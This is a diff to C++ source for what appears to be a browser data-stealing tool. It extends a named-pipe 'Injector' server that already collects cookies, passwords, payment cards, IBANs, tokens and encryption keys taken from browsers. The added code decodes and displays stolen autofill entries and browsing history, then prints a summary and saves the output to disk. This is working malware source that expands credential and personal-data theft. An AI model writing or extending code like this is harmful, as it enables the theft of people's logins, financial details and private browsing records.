@@ -80,6 +80,10 @@ namespace Injector {
 
         Core::Console console(verbose);
 
+        // Initialize new stats counters
+        m_stats.autofill = 0;
+        m_stats.history = 0;
+
         while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
             DWORD available = 0;
             if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
@@ -165,6 +169,18 @@ namespace Injector {
                     int count = std::stoi(msg.substr(7));
                     m_stats.tokens += count;
                     console.ExtractionResult("Tokens", count);
+                }
+                // NEW: Autofill summary parsing
+                else if (msg.rfind("AUTOFILL:", 0) == 0) {
+                    int count = std::stoi(msg.substr(9));
+                    m_stats.autofill += count;
+                    console.ExtractionResult("Autofill", count);
+                }
+                // NEW: History summary parsing
+                else if (msg.rfind("HISTORY:", 0) == 0) {
+                    int count = std::stoi(msg.substr(8));
+                    m_stats.history += count;
+                    console.ExtractionResult("History", count);
                 }
                 else if (msg.rfind("DATA:", 0) == 0) {
                     std::string data = msg.substr(5);
@@ -274,6 +290,41 @@ namespace Injector {
                         console.DisplayToken(service, token);
                     }
                 }
+                // NEW: Autofill detail parsing
+                else if (msg.rfind("AUTOFILL_DETAIL:", 0) == 0) {
+                    // Format: AUTOFILL_DETAIL:BASE64(field_name)|BASE64(value)
+                    std::string data = msg.substr(16);
+                    size_t pos = data.find('|');
+                    if (pos != std::string::npos) {
+                        // Base64 decode ALL fields
+                        std::string fieldName = Base64Decode(data.substr(0, pos));
+                        std::string value = Base64Decode(data.substr(pos + 1));
+                        
+                        console.DisplayAutofill(fieldName, value);
+                    }
+                }
+                // NEW: History detail parsing
+                else if (msg.rfind("HISTORY_DETAIL:", 0) == 0) {
+                    // Format: HISTORY_DETAIL:BASE64(url)|BASE64(title)|visit_count|last_visit_time
+                    std::string data = msg.substr(15);
+                    std::vector<std::string> parts;
+                    size_t pos = 0;
+                    while ((pos = data.find('|')) != std::string::npos) {
+                        parts.push_back(data.substr(0, pos));
+                        data.erase(0, pos + 1);
+                    }
+                    parts.push_back(data);
+                    
+                    if (parts.size() == 4) {
+                        // Base64 decode text fields
+                        std::string url = Base64Decode(parts[0]);
+                        std::string title = Base64Decode(parts[1]);
+                        std::string visitCount = parts[2];
+                        std::string lastVisitTime = parts[3];
+                        
+                        console.DisplayHistory(url, title, std::stoi(visitCount), lastVisitTime);
+                    }
+                }
                 else if (msg.rfind("[-]", 0) == 0) {
                     console.Error(msg.substr(4));
                 }
@@ -293,6 +344,11 @@ namespace Injector {
         if (m_stats.hasAppKey || m_stats.hasOsKey) {
             console.KeySummary(m_stats.hasAppKey, m_stats.hasOsKey);
         }
+
+        // Show final summary with all data types
+        console.Summary(m_stats.cookies, m_stats.passwords, m_stats.cards, 
+                       m_stats.ibans, m_stats.tokens, m_stats.autofill, 
+                       m_stats.history, m_stats.profiles, "Output saved to disk");
     }
 
     std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
